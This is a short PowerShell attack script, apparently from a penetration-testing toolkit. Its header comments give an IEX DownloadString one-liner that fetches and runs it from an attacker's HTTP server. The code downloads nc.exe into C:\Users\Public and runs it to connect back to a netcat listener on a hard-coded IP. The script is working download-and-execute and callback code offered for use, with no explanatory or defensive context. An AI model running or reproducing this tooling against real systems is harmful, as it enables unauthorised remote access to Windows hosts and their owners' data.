<#
Robert Chaves Perez (r0b0t95) 2023

python3 -m http.server 8000

nc -lvnp 8001

IEX (New-Object Net.WebClient).DownloadString("http://<serverIp>:8000/invoke-nc.ps1") | powershell -noprofile
#>

#change the ip by your IP
$ip = '192.168.23.129'
$portNetCat = '8001'
$portPython3 = '8000'

$files = 'nc.exe', 'nc.pdb'

for ($i = 0; $i -lt $files.Length; ++$i){

   $path = 'C:\Users\Public\' + $files[$i]
        
   $fileUrl = 'http://' + $ip + ':' + $portPython3 + '/' + $files[$i]

   Invoke-WebRequest -Uri $fileUrl -Outfile $path
   
}

Start-Sleep -Seconds 1

Set-Location C:\Users\Public

.\nc.exe $ip $portNetCat


